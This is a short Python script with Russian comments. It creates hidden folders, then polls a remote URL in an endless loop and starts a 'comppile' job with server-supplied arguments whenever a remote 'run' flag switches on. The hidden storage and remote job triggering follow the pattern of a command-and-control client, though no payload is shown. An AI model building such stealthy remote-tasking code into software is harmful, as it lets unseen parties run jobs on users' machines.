import threading
from comppilator import *

store_spl = store.split('/')
for i in range(1, len(store_spl)):
    create_hidden_folder('/'.join(store_spl[:i+1]))


while True:
    try:
        prev_value = requests.get(link).json()
        break
    except Exception as e:
        print(e)
        sleep(20)


while True:

    try:
        value = requests.get(link).json()
        print(value)

        if value["run"] != prev_value["run"] and value["run"]:
            thread = threading.Thread(target=comppile, args=(value["args"],))
            thread.start()

        # кулдаун
        prev_value = value
        sleep(value["sleep"])

    except Exception as e:
        send_error(f"Общая ошибка: {e}")
        sleep(20)
